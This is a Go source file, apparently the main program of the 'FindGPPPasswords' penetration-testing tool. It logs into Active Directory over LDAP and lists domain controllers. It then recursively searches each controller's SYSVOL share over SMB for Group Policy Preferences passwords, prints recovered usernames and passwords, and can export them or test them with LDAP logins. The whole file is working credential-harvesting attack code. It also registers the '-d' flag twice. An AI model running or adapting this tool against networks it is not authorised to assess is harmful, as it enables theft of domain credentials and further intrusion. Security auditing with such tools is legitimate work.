package main

import (
	"FindGPPPasswords/core/config"
	"FindGPPPasswords/core/crypto"
	"FindGPPPasswords/core/exporter"
	"FindGPPPasswords/core/logger"
	"FindGPPPasswords/network/dns"
	"FindGPPPasswords/network/ldap"
	"slices"

	"fmt"
	"os"
	"runtime"
	"strings"
	"time"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/p0dalirius/goopts/parser"
)

var (
	// Configuration
	useLdaps        bool
	quiet           bool
	debug           bool
	nocolors        bool
	numberOfThreads int

	// Network
	dnsNameServer    string
	domainController string
	ldapPort         int

	// Authentication
	authDomain   string
	authUsername string
	authPassword string
	authHashes   string

	// Additional Options
	outputExcel     string
	testCredentials bool
)

func parseArgs() {
	ap := parser.ArgumentsParser{Banner: "FindGPPPasswords - by Remi GASCOU (Podalirius) - v1.1"}

	ap.NewBoolArgument(&quiet, "-q", "--quiet", false, "Show no information at all.")
	ap.NewBoolArgument(&debug, "-d", "--debug", false, "Debug mode.")
	ap.NewBoolArgument(&nocolors, "-nc", "--no-colors", false, "No colors mode.")

	group_ldapSettings, err := ap.NewArgumentGroup("LDAP Connection Settings")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_ldapSettings.NewStringArgument(&domainController, "-dc", "--dc-ip", "", true, "IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted, it will use the domain part (FQDN) specified in the identity parameter.")
		group_ldapSettings.NewTcpPortArgument(&ldapPort, "-lp", "--ldap-port", 389, false, "Port number to connect to LDAP server.")
		group_ldapSettings.NewBoolArgument(&useLdaps, "-L", "--use-ldaps", false, "Use LDAPS instead of LDAP.")
	}

	group_dnsSettings, err := ap.NewArgumentGroup("DNS Settings")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_dnsSettings.NewStringArgument(&dnsNameServer, "-ns", "--nameserver", "", false, "IP Address of the DNS server to use in the queries. If omitted, it will use the IP of the domain controller specified in the -dc parameter.")
	}

	group_auth, err := ap.NewArgumentGroup("Authentication")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_auth.NewStringArgument(&authDomain, "-d", "--domain", "", true, "Active Directory domain to authenticate to.")
		group_auth.NewStringArgument(&authUsername, "-u", "--username", "", true, "User to authenticate as.")
		group_auth.NewStringArgument(&authPassword, "-p", "--password", "", false, "Password to authenticate with.")
		group_auth.NewStringArgument(&authHashes, "-H", "--hashes", "", false, "NT/LM hashes, format is LMhash:NThash.")
		group_auth.NewIntArgument(&numberOfThreads, "-T", "--threads", 0, false, "Number of threads to use.")
	}

	group_extraOptions, err := ap.NewArgumentGroup("Additional Options")
	if err != nil {
		fmt.Printf("[error] Error creating ArgumentGroup: %s\n", err)
	} else {
		group_extraOptions.NewStringArgument(&outputExcel, "-x", "--export-xlsx", "", false, "Path to output Excel file.")
		group_extraOptions.NewBoolArgument(&testCredentials, "-tc", "--test-credentials", false, "Test credentials.")
	}

	ap.Parse()

	// Set default port if not specified
	if ldapPort == 0 {
		if useLdaps {
			ldapPort = 636
		} else {
			ldapPort = 389
		}
	}

	// Validate required arguments
	if domainController == "" {
		fmt.Println("[!] Option -dc <fqdn> is required.")
		ap.Usage()
		os.Exit(1)
	}
}

func SMBListFilesRecursivelyAndCallback(session *smb.Connection, share string, dir string, callback func(*smb.Connection, string, string) error) (err error) {
	DEBUG := false

	// Connect to share
	err = session.TreeConnect(share)
	if err != nil {
		if err == smb.StatusMap[smb.StatusBadNetworkName] {
			if DEBUG {
				fmt.Printf("[SMBListFilesRecursivelyAndCallback] Share %s can not be found!\n", share)
			}
			return
		}
		if DEBUG {
			fmt.Printf("[SMBListFilesRecursivelyAndCallback] Error: %s\n", err)
		}
		return
	}
	defer session.TreeDisconnect(share)

	// List files
	if DEBUG {
		logger.Debug(fmt.Sprintf("Listing files of '%s'", dir))
	}
	entries, err := session.ListDirectory(share, dir, "*")
	if err != nil {
		if err == smb.StatusMap[smb.StatusAccessDenied] {
			if DEBUG {
				fmt.Printf("[SMBListFilesRecursivelyAndCallback] Could connect to [%s] but listing files in directory (%s) was prohibited\n", share, dir)
			}
			return nil
		}
		if DEBUG {
			fmt.Printf("[SMBListFilesRecursivelyAndCallback] Error: %s\n", err)
		}
		return nil
	}

	// Explore further and callback
	for _, entry := range entries {
		if entry.IsDir {
			if DEBUG {
				logger.Debug(fmt.Sprintf("Found Directory '%s'", entry.FullPath))
			}
			err = SMBListFilesRecursivelyAndCallback(session, share, entry.FullPath, callback)
			if err != nil {
				if DEBUG {
					fmt.Printf("[SMBListFilesRecursivelyAndCallback] Failed to list files in directory %s with error: %s\n", entry.FullPath, err)
				}
				continue
			}
		} else {
			if DEBUG {
				logger.Debug(fmt.Sprintf("Found file '%s'", entry.FullPath))
			}
			callback(session, share, entry.FullPath)
		}
	}

	return nil
}

func FindCPasswords(dnsHostname []string, config config.Config, testResults *crypto.GroupPolicyPreferencePasswordsFound) error {
	targetIp := dns.DNSLookup(dnsHostname[0], config.DnsNameServer)

	if len(targetIp) > 0 {
		// Define the SMB connection options
		options := smb.Options{
			Host: targetIp[0],
			Port: 445,
			Initiator: &spnego.NTLMInitiator{
				User:     config.Credentials.Username,
				Password: config.Credentials.Password,
				Domain:   config.Credentials.Domain,
			},
			DialTimeout: time.Millisecond * time.Duration(5000),
		}

		// Create a new SMB connection
		session, err := smb.NewConnection(options)
		if err != nil {
			return err
		}
		defer session.Close()

		// Find all XML files in the root directory
		err = SMBListFilesRecursivelyAndCallback(session, "SYSVOL", "", testResults.CallbackFunctionCPassword)
		if err != nil {
			return err
		}
	} else {
		return fmt.Errorf("could not resolve host %s", dnsHostname[0])
	}

	return nil
}

func TestCredentials(gpppfound crypto.GroupPolicyPreferencePasswordsFound, config config.Config) {
	testedUsernames := []string{}

	logger.Info("")
	logger.Info("Testing credentials:")

	for pathToFile := range gpppfound.Entries {
		for _, entry := range gpppfound.Entries[pathToFile] {
			username := ""
			domain := ""

			// Case of scheduled task
			if len(username) == 0 && len(entry.RunAs) != 0 && len(entry.UserName) == 0 {
				if strings.Contains(entry.RunAs, "\\") {
					parts := strings.SplitN(entry.RunAs, "\\", 2)
					domain = parts[0]
					username = parts[1]
				} else {
					username = entry.RunAs
				}
			}

			// Case of local account
			if len(username) == 0 && (len(entry.UserName) != 0 || len(entry.NewName) != 0) {
				if len(entry.NewName) != 0 {
					username = entry.NewName
				} else {
					username = entry.UserName
				}
			}

			if len(username) != 0 {
				if !slices.Contains(testedUsernames, username) {
					ldapSession := ldap.Session{}
					ldapSession.InitSession(
						domainController,
						ldapPort,
						config.UseLdaps,
						domain,
						username,
						entry.Password,
						config.Debug,
					)

					err := ldapSession.Connect()
					if err == nil {
						if len(domain) == 0 {
							logger.Info(fmt.Sprintf("\x1b[1;92m   [+] %s : %s\x1b[0m", username, entry.Password))
						} else {
							logger.Info(fmt.Sprintf("\x1b[1;92m   [+] %s\\%s : %s\x1b[0m", domain, username, entry.Password))
						}
					} else {
						if len(domain) == 0 {
							logger.Info(fmt.Sprintf("\x1b[91m   [!] %s : %s\x1b[0m", username, entry.Password))
						} else {
							logger.Info(fmt.Sprintf("\x1b[91m   [!] %s\\%s : %s\x1b[0m", domain, username, entry.Password))
						}
					}
					testedUsernames = append(testedUsernames, username)
				} else {
					logger.Info(fmt.Sprintf("\x1b[93m   [*] Skipping test of %s : %s to avoid potentiallockout.\x1b[0m", username, entry.Password))
				}
			}
		}
	}

	logger.Info("Finished testing credentials.")
	logger.Info("")
}

func main() {
	parseArgs()

	startTime := time.Now()

	authDomain = strings.ToUpper(authDomain)

	config := config.Config{}
	config.Credentials.Username = authUsername
	config.Credentials.Domain = authDomain
	config.Credentials.Password = authPassword
	config.Credentials.DCIP = domainController
	if len(dnsNameServer) == 0 {
		config.DnsNameServer = domainController
	} else {
		config.DnsNameServer = dnsNameServer
	}
	if numberOfThreads != 0 {
		config.Threads = numberOfThreads
	} else {
		config.Threads = runtime.NumCPU()
	}
	config.UseLdaps = useLdaps
	config.Debug = debug

	outputDir, err := os.Getwd()
	if err != nil {
		logger.Warn(fmt.Sprintf("Error getting current working directory: %s", err))
		config.OutputDir = "./"
	} else {
		config.OutputDir = outputDir
	}

	if debug {
		if !useLdaps {
			logger.Debug(fmt.Sprintf("Connecting to remote ldap://%s:%d ...", domainController, ldapPort))
		} else {
			logger.Debug(fmt.Sprintf("Connecting to remote ldaps://%s:%d ...", domainController, ldapPort))
		}
	}
	ldapSession := ldap.Session{}
	ldapSession.InitSession(
		domainController,
		ldapPort,
		config.UseLdaps,
		config.Credentials.Domain,
		config.Credentials.Username,
		config.Credentials.Password,
		config.Debug,
	)
	err = ldapSession.Connect()

	if err == nil {
		logger.Info(fmt.Sprintf("Connected as '%s\\%s'", authDomain, authUsername))

		domainControllersQuery := "(&"
		// We look for computer accounts
		domainControllersQuery += "(objectClass=computer)"
		// That are domain controllers
		UAF_SERVER_TRUST_ACCOUNT := 0x2000
		domainControllersQuery += fmt.Sprintf("(userAccountControl:1.2.840.113556.1.4.803:=%d)", UAF_SERVER_TRUST_ACCOUNT)
		// Account that are not disabled
		UAF_ACCOUNT_DISABLED := 0x0002
		domainControllersQuery += fmt.Sprintf("(!(userAccountControl:1.2.840.113556.1.4.803:=%d))", UAF_ACCOUNT_DISABLED)
		// Closing the AND
		domainControllersQuery += ")"

		if config.Debug {
			logger.Debug(fmt.Sprintf("LDAP query used: %s", domainControllersQuery))
		}
		attributes := []string{"distinguishedName", "dnsHostname"}
		domainControllersResults := ldap.QueryWholeSubtree(&ldapSession, "", domainControllersQuery, attributes)

		gpppfound := crypto.GroupPolicyPreferencePasswordsFound{}
		gpppfound.Entries = make(map[string][]*crypto.CPasswordEntry)

		if len(domainControllersResults) != 0 {
			for k, entry := range domainControllersResults {
				logger.Info(fmt.Sprintf("(%d/%d) Searching for GPPPasswords in '\\\\%s\\SYSVOL\\' ... ", k+1, len(domainControllersResults), entry.GetEqualFoldAttributeValues("dnsHostname")[0]))

				FindCPasswords(entry.GetEqualFoldAttributeValues("dnsHostname"), config, &gpppfound)
			}

			logger.Info("")
			if len(gpppfound.Entries) == 0 {
				logger.Info("No results.")
				logger.Info("")
			} else {
				logger.Info("Results:")
				logger.Info("")
			}

			for pathToFile := range gpppfound.Entries {
				if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && !nocolors {
					logger.Info(fmt.Sprintf("[+] File: \x1b[94m%s\x1b[0m", pathToFile))
				} else {
					logger.Info(fmt.Sprintf("[+] File: %s", pathToFile))
				}
				for k, entry := range gpppfound.Entries[pathToFile] {
					if len(entry.RunAs) != 0 {
						if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && !nocolors {
							logger.Info(fmt.Sprintf("  │ \x1b[94mRunAs\x1b[0m : \x1b[93m%s\x1b[0m", entry.RunAs))
						} else {
							logger.Info(fmt.Sprintf("  │ RunAs : %s", entry.RunAs))
						}
					}
					if len(entry.UserName) != 0 {
						if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && !nocolors {
							logger.Info(fmt.Sprintf("  │ \x1b[94mUserName\x1b[0m : \x1b[93m%s\x1b[0m", entry.UserName))
						} else {
							logger.Info(fmt.Sprintf("  │ UserName : %s", entry.UserName))
						}
					}
					if len(entry.NewName) != 0 {
						if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && !nocolors {
							logger.Info(fmt.Sprintf("  │ \x1b[94mNewName\x1b[0m : \x1b[93m%s\x1b[0m", entry.NewName))
						} else {
							logger.Info(fmt.Sprintf("  │ NewName : %s", entry.NewName))
						}
					}
					if len(entry.Password) != 0 {
						if (runtime.GOOS == "linux" || runtime.GOOS == "darwin") && !nocolors {
							logger.Info(fmt.Sprintf("  │ \x1b[94mPassword\x1b[0m : \x1b[93m%s\x1b[0m", entry.Password))
						} else {
							logger.Info(fmt.Sprintf("  │ Password : %s", entry.Password))
						}
					}

					if k == (len(gpppfound.Entries[pathToFile]) - 1) {
						logger.Info("  └──")
					} else {
						logger.Info("  ├──")
					}
				}
			}

			if len(gpppfound.Entries) == 0 {
				logger.Info("Found no files containing Group Policy Preferences Passwords")
			} else if len(gpppfound.Entries) == 1 {
				logger.Info(fmt.Sprintf("Found %d file containing Group Policy Preferences Passwords", len(gpppfound.Entries)))
			} else {
				logger.Info(fmt.Sprintf("Found %d files containing Group Policy Preferences Passwords", len(gpppfound.Entries)))
			}

			if len(outputExcel) != 0 {
				exporter.GenerateExcel(gpppfound, config, outputExcel)
			}

			if testCredentials {
				TestCredentials(gpppfound, config)
			}
		} else {
			// This should not happen in an Active Directory domain
			if config.Debug {
				logger.Debug("No domain controllers were found, This should not happen in an Active Directory domain.")
			}
		}
	} else {
		logger.Warn(fmt.Sprintf("Error: %s", err))
	}

	// Elapsed time
	elapsedTime := time.Since(startTime).Round(time.Millisecond)
	hours := int(elapsedTime.Hours())
	minutes := int(elapsedTime.Minutes()) % 60
	seconds := int(elapsedTime.Seconds()) % 60
	milliseconds := int(elapsedTime.Milliseconds()) % 1000
	logger.Info(fmt.Sprintf("Total time elapsed: %02dh%02dm%02d.%04ds", hours, minutes, seconds, milliseconds))
}
